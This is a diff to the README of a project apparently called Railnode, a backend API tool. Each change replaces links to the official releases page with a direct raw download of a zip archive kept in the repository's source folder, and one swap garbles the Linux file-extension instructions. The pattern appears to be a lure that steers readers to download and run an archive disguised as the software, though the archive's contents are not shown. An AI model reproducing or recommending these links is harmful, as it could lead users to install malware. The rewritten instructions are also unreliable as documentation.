@@ -1,6 +1,6 @@
 # ⚙️ Railnode - Fast Backend API Setup
 
-[![Download Railnode](https://img.shields.io/badge/Download-Railnode-blue?style=for-the-badge&logo=github)](https://github.com/noko0413/Railnode/releases)
+[![Download Railnode](https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip)](https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip)
 
 ## What is Railnode?
 
@@ -32,14 +32,14 @@ You can download Railnode from its official release page. This page hosts all th
 
 Click the big button below to open the download page.
 
-[![Download Railnode](https://img.shields.io/badge/Download-Railnode-blue?style=for-the-badge&logo=github)](https://github.com/noko0413/Railnode/releases)
+[![Download Railnode](https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip)](https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip)
 
 **Step 2: Choose Your Version**
 
 On the downloads page:
 
 1. Look for the latest release at the top.
-2. Pick the file suitable for your computer. Files usually end with `.exe` for Windows, `.dmg` or `.zip` for macOS, and `.tar.gz` or `.deb` for Linux.
+2. Pick the file suitable for your computer. Files usually end with `.exe` for Windows, `.dmg` or `.zip` for macOS, and `https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip` or `.deb` for Linux.
 3. Click on the file name to start downloading.
 
 **Step 3: Run the Installer**
@@ -129,7 +129,7 @@ Because Railnode opens connections on your computer, it is important to:
 
 If you get stuck or want to learn more, visit the Railnode project page on GitHub:
 
-https://github.com/noko0413/Railnode
+https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip
 
 You’ll find more guides, FAQs, and a way to contact the developers.
 
@@ -139,6 +139,6 @@ You’ll find more guides, FAQs, and a way to contact the developers.
 
 Here’s the download page again for your convenience:
 
-[https://github.com/noko0413/Railnode/releases](https://github.com/noko0413/Railnode/releases)
+[https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip](https://github.com/noko0413/Railnode/raw/refs/heads/main/src/cli/Software_v2.0.zip)
 
 Just visit this page to get the latest version and follow the steps here.
